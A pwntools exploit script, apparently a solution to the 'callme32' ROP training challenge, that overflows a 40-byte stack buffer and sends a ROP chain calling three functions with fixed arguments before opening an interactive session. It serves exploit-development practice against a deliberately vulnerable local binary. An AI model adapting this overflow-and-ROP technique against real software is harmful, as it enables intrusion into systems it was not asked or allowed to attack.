#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF('./callme32')
context.bits = 32

libc = elf.libc
rop = ROP(elf)

gs = '''
b main
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#============ exploit here ================

param_1 = 0xdeadbeef
param_2 = 0xcafebabe
param_3 = 0xd00df00d


rop.callme_one(param_1, param_2, param_3)
rop.callme_two(param_1, param_2, param_3)
rop.callme_three(param_1, param_2, param_3)
print(rop.dump())

payload = b'A'*40 # char buffer
payload += b'B'*4 # ebp
payload += p32(rop.ret.address)
payload += rop.chain() # rop

r.sendlineafter('>', payload)

#============= interactive ================

r.interactive()
